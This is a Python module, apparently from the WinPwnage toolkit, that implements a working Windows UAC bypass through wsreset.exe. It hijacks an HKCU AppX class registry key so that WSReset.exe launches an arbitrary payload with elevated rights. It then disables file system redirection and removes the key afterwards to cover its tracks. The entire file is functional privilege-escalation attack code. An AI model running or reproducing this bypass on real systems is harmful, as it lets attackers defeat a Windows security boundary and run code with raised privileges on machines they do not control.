from winpwnage.core.prints import *
from winpwnage.core.utils import *
import time
import os

# https://www.activecyber.us/activelabs/windows-uac-bypass

uacMethod14_info = {
	"Description": "UAC bypass using wsreset.exe",
	"Method": "Registry key (Class) manipulation",
	"Id": "14",
	"Type": "UAC bypass",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "17134",
	"Admin": False,
	"Function Name": "uacMethod14",
	"Function Payload": True,
}

def uacMethod14_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
		print_success("Successfully cleaned up")
		print_success("All done!")
	else:
		print_error("Unable to cleanup")
		return False

def uacMethod14(payload):
	if payloads().exe(payload):
		path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"

		if registry().modify_key(hkey="hkcu", path=path, name=None,
						value="{cmd_path} /c start {payload}".format(
						cmd_path=os.path.join(information().system_directory(),
						"cmd.exe"), payload=payloads().exe(payload)[1]), create=True):
			if registry().modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payloads().exe(payload)[1])))
			else:
				print_error("Unable to create registry keys")
				for x in Constant.output:
					if "error" in x:
						uacMethod14_cleanup(path)
						return False
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			
			print_info("Waiting for wsreset.exe to finish, this can take a few seconds")
			exit_code = process().create("WSReset.exe", get_exit_code=True)
			if exit_code == 0:
				print_success("Successfully spawned process ({})".format(os.path.join(payloads().exe(payload)[1])))
				time.sleep(5)
				uacMethod14_cleanup(path)
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payloads().exe(payload)[1])))
				for x in Constant.output:
					if "error" in x:
						uacMethod14_cleanup(path)
						return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False